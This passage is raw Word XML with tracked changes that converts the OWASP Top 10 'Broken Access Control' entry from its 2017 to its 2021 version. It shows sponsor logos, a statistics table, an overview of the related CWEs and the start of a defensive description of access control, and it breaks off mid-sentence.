        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">Secure Code Warrior](assets/securecodewarrior.png){ width="256" }](https://securecodewarrior.com)    </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7772E001" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="260" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0D0871E4" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="261" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:ins w:id="262" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>[![</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Just Eats](assets/JustEat.png){ width="256" }](https://www.just-eat.co.uk/)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1805DE1F" w14:textId="77777777" w:rsidR="00E300D6" w:rsidRDefault="00E300D6">
      <w:pPr>
        <w:rPr>
          <w:ins w:id="263" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="264" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:br w:type="page"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="3426F7C5"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55FC165C"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"https://owasp.org/Top10/A01_2021-Broken_Access_Control/"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42F2A070" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>title:   "A01:2021 – Broken Access Control"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7101BA6E" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>id:      "A01:2021"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A5A14AE"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1CD847D5"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410E967F"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#A01:2021 – Broken Access Control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[icon](assets/TOP_10_Icons_Final_Broken_Access_Control.png){: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name="Broken Access Control", lang=lang, source=source, parent=parent, predecessor=</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>extra.osib.document</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> ~ ".2017.5" ) }}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27E179F9" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="265" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="266" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:br/>
        </w:r>
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText># A5:2017 Broken Access Control</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="1011175C" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="267" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7AB9DCFD" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="268" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="269" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>| Threat agents/Attack vectors | Security Weakness  | Impacts |</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="475FDB6F" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="270" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="271" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>| -- | -- | -- |</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="4371FF2D" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="272" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="273" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>| Access Lvl : Exploitability 2 | Prevalence 2 : Detectability 2 | Technical 3 : Business |</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="075730A0" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="274" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="275" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>| Exploitation of access control is a core skill of attackers. [SAST](https://www.owasp.org/index.php/Source_Code_Analysis_Tools) and [DAST](https://www.owasp.org/index.php/Category:Vulnerability_Scanning_Tools) tools can detect the absence of access control but cannot verify if it is functional when it is present. Access control is detectable using manual means, or possibly through automation for the absence of access controls in certain frameworks. | Access control weaknesses are common due to the lack of automated detection, and lack of effective functional testing by application developers. Access control detection is not typically amenable to automated static or dynamic testing. Manual testing is the best way to detect missing or ineffective access control, including HTTP method (GET vs PUT, etc), controller, direct object references, etc. | The technical impact is attackers acting as users or administrators, or users using privileged functions, or creating, accessing, updating or deleting every record. The business impact depends on the protection needs of the application and data. |</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="36F12458" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="276" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5C0C22FA" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="277" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="278" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>## Is the Application Vulnerable?</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="58A6B6F2" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="279" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="67B0557C" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="280" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="72CC5D98" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="281" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="252F9179" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="282" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="283" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>## Factors</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2CEC8F2C" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="284" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0A3D5804" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="285" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="286"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6E663A70" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="287" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="288" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>|:-------------:|:--------------------:|:--------------------:|:--------------:|:--------------:|:----------------------:|:---------------------:|:-------------------:|:------------:|</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="62DCC23D" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="289" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="290" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>| 34          | 55.97%             | 3.81%              | 6.92                 | 5.93                | 94.55%       | 47.72%       | 318,487           | 19,013     |</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="4A147933" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="291" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0E7A679B" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="292" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="293" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>## Overview</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="08E56321" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="294" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="631896D8" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="295" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="296" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Moving up from the fifth position, 94% of applications were tested for</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="415FBC9A" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="297" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="298" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>some form of broken access control with the average incidence rate of 3.81%, and has the most occurrences in the contributed dataset with over 318k. Notable Common Weakness Enumerations (CWEs) included are *CWE-200: Exposure of Sensitive Information to an Unauthorized Actor*, *CWE-201:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="10D33B83" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="299" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="300" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">Insertion of Sensitive Information </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Into</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> Sent Data*, and *CWE-352:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="129EC2B8" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="301" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="302" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Cross-Site Request Forgery*.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6FA0D42C" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="303" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="07F89931" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="304" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="305" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>## Description</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6719B45B" w14:textId="77777777" w:rsidR="003A277D" w:rsidRPr="00841D1E" w:rsidRDefault="003A277D" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="306" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6028F2CE" w14:textId="0EC551DC" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="307" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Access control enforces policy such that users cannot act outside of</w:t>
      </w:r>
      <w:del w:id="308" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="1DF7AA52" w14:textId="42E226A2" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="309" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>their intended permissions. Failures typically lead to unauthorized</w:t>
      </w:r>
      <w:del w:id="310" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="414DCB54" w14:textId="4FB99A2F" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="311" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>information disclosure, modification</w:t>
      </w:r>
      <w:ins w:id="312" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> or destruction of all data</w:t>
      </w:r>
      <w:del w:id="313" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>,</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> or</w:t>
      </w:r>
      <w:del w:id="314" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
